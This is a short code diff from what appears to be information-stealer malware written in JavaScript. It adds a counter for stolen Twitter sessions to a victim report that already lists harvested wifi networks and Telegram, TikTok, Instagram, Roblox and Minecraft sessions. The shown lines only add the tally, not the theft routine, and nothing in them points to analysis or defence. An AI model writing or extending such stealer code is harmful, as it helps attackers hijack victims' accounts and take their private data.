@@ -33,6 +33,7 @@
             bookmarks: 0,
             screenshots: 0,
 
+            twitter_found: 0,
             tiktok_found: 0,
             roblox_found: 0,
             instagram_found: 0,
@@ -3181,6 +3182,7 @@
                 "📶 Wifi networks": client.config.counter.wifinetworks,
                 "📱 Found Telegram session(s)?": client.config.counter.telegram ? "Yes" : "No",
                 "👉 Found TikTok session(s)": client.config.counter.tiktok_found,
+                "🐦 Found Twitter session(s)": client.config.counter.twitter_found,
                 "😋 Found Instagram session(s)": client.config.counter.instagram_found,
                 "🤖 Found Roblox session(s)": client.config.counter.roblox_found,
                 "🧱 Found Minecraft session(s)": client.config.counter.minecraft_found,
